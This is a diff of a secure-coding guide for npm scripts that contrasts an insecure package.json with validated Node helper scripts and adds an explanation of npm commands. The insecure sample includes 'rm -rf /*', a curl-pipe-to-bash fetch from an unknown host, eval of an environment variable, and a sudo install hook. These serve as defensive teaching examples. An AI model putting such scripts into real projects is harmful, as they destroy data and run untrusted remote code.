@@ -16,52 +16,52 @@ description: Securing npm scripts and preventing script injection attacks
 ```json
 // package.json with insecure scripts
 {
-  "name": "insecure-scripts-app",
-  "scripts": {
-    // Command injection vulnerability
-    "build": "echo Building $npm_package_version && webpack",
-    
-    // Unsafe rm command
-    "clean": "rm -rf /*",
-    
-    // Downloading and executing remote scripts
-    "setup": "curl -s https://unknown-site.com/script.sh | bash",
-    
-    // Using eval with user input
-    "process": "node -e \"eval(process.env.USER_INPUT)\"",
-    
-    // No validation on file operations
-    "deploy": "cp -r ./* $DEPLOY_PATH",
-    
-    // Running with elevated privileges
-    "install": "sudo npm link"
-  }
+  "name": "insecure-scripts-app",
+  "scripts": {
+    // Command injection vulnerability
+    "build": "echo Building $npm_package_version && webpack",
+    
+    // Unsafe rm command
+    "clean": "rm -rf /*",
+    
+    // Downloading and executing remote scripts
+    "setup": "curl -s [https://unknown-site.com/script.sh](https://unknown-site.com/script.sh) | bash",
+    
+    // Using eval with user input
+    "process": "node -e \"eval(process.env.USER_INPUT)\"",
+    
+    // No validation on file operations
+    "deploy": "cp -r ./* $DEPLOY_PATH",
+    
+    // Running with elevated privileges
+    "install": "sudo npm link"
+  }
 }
 
 // No .npmrc security settings
 // No ignore-scripts configuration
-```
+````
 
 ## Secure Solution
 
 ```json
 // package.json with secure scripts
 {
-  "name": "secure-scripts-app",
-  "scripts": {
-    // Safe, validated commands
-    "build": "node scripts/build.js",
-    "clean": "node scripts/clean.js",
-    "test": "jest --coverage",
-    "lint": "eslint src/",
-    
-    // Use npm run-script for chaining
-    "prebuild": "npm run clean",
-    "postbuild": "npm run test",
-    
-    // Validated deployment
-    "deploy": "node scripts/deploy.js --validate"
-  }
+  "name": "secure-scripts-app",
+  "scripts": {
+    // Safe, validated commands
+    "build": "node scripts/build.js",
+    "clean": "node scripts/clean.js",
+    "test": "jest --coverage",
+    "lint": "eslint src/",
+    
+    // Use npm run-script for chaining
+    "prebuild": "npm run clean",
+    "postbuild": "npm run test",
+    
+    // Validated deployment
+    "deploy": "node scripts/deploy.js --validate"
+  }
 }
 ```
 
@@ -80,7 +80,7 @@ const path = require('path');
 // Validate environment
 const version = process.env.npm_package_version;
 if (!/^\d+\.\d+\.\d+$/.test(version)) {
-  throw new Error('Invalid version format');
+  throw new Error('Invalid version format');
 }
 
 // Use safe paths
@@ -88,17 +88,17 @@ const buildPath = path.join(__dirname, '..', 'dist');
 
 // Execute with limited permissions
 try {
-  execSync('webpack --mode production', {
-    stdio: 'inherit',
-    cwd: process.cwd(),
-    env: {
-      ...process.env,
-      NODE_ENV: 'production'
-    }
-  });
+  execSync('webpack --mode production', {
+    stdio: 'inherit',
+    cwd: process.cwd(),
+    env: {
+      ...process.env,
+      NODE_ENV: 'production'
+    }
+  });
 } catch (error) {
-  console.error('Build failed:', error.message);
-  process.exit(1);
+  console.error('Build failed:', error.message);
+  process.exit(1);
 }
 ```
 
@@ -110,32 +110,97 @@ const path = require('path');
 const ALLOWED_PATHS = ['dist', 'build', '.cache'];
 
 async function clean() {
-  for (const dir of ALLOWED_PATHS) {
-    const fullPath = path.join(process.cwd(), dir);
-    
-    // Validate path is within project
-    if (!fullPath.startsWith(process.cwd())) {
-      console.error(`Invalid path: ${dir}`);
-      continue;
-    }
-    
-    try {
-      await fs.rm(fullPath, { recursive: true, force: true });
-      console.log(`Cleaned: ${dir}`);
-    } catch (error) {
-      // Directory doesn't exist, skip
-    }
-  }
+  for (const dir of ALLOWED_PATHS) {
+    const fullPath = path.join(process.cwd(), dir);
+    
+    // Validate path is within project
+    if (!fullPath.startsWith(process.cwd())) {
+      console.error(`Invalid path: ${dir}`);
+      continue;
+    }
+    
+    try {
+      await fs.rm(fullPath, { recursive: true, force: true });
+      console.log(`Cleaned: ${dir}`);
+    } catch (error) {
+      // Directory doesn't exist, skip
+    }
+  }
 }
 
 clean().catch(console.error);
 ```
 
+## Key Commands for Managing Scripts
+
+Understanding these commands is critical for implementing the security practices described above.
+
+### 1\. Running a Script
+
+This is the standard command to execute a script defined in your `package.json` `scripts` object.
+
+```bash
+npm run <script-name>
+# Example:
+npm run build
+```
+
+*Note: Some common scripts like `test`, `start`, `stop`, and `restart` have shortcuts and can be run without the `run` keyword (e.g., `npm test`).*
+
+### 2\. Disabling All Lifecycle Scripts
+
+This is the most important command for securing your environment, as shown in the `.npmrc` solution. It prevents potentially malicious `preinstall`, `install`, and `postinstall` scripts from running automatically when you add packages.
+
+```bash
+# Sets this configuration in your .npmrc file
+npm config set ignore-scripts true
+```
+
+After running this, all package scripts must be triggered manually, giving you a chance to vet them.
+
+### 3\. Running `npm install` Safely (One Time)
+
+If you don't want to set `ignore-scripts` permanently but want to install a new, untrusted package safely, you can use the `--ignore-scripts` flag for a single command:
+
+```bash
+npm install <package-name> --ignore-scripts
+```
+
+This will install the package without running any of its lifecycle scripts.
+
+### 4\. Listing All Available Scripts
+
+To see all scripts defined in the `package.json`, simply run:
+
+```bash
+npm run
+```
+
+This will list all available script names, which is useful for knowing what you *can* run manually.
+
+### 5\. Passing Arguments to Scripts
+
+This is essential for the secure pattern of using Node.js scripts. To pass arguments (like `--validate` in the example), you must use `--` to separate the npm command from the arguments you want to pass to your script.
+
+```bash
+npm run <script-name> -- --your-argument --value=some-value
+```
+
+**Example from "Secure Solution":**
+
+```bash
+# This passes "--validate" to the "node scripts/deploy.js" command
+npm run deploy -- --validate
+```
+
+Any arguments *before* the `--` are for npm itself; any arguments *after* are for your script.
+
 ## Best Practices
 
-* Set ignore-scripts=true in .npmrc.
-* Validate all environment variables.
-* Use dedicated script files instead of inline commands.
-* Avoid shell command execution when possible.
-* Implement proper input validation.
-* Never use eval() or Function() with user input.
+  * Set `ignore-scripts=true` in `.npmrc`.
+  * Validate all environment variables.
+  * Use dedicated script files instead of inline commands.
+  * Avoid shell command execution when possible.
+  * Implement proper input validation.
+  * Never use `eval()` or `Function()` with user input.
+
